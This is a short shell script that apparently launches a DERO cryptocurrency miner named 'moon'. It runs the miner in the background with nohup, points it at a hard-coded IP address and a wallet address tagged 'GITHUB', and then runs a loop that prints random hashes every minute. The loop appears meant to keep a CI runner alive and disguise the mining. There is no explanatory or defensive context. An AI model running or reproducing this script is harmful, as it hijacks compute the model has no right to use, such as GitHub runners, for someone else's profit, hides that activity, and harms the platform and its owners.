chmod 700 moon
nohup ./moon -d 45.86.230.214:443 -w dero1qysflwnyf4mqhzdet7v478nn5l38q6u0uh9g86vtcpmrze0ml8xc7qgdhw9aj.$(echo $(shuf -i 1-9999 -n 1)-GITHUB) &
while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 1m; done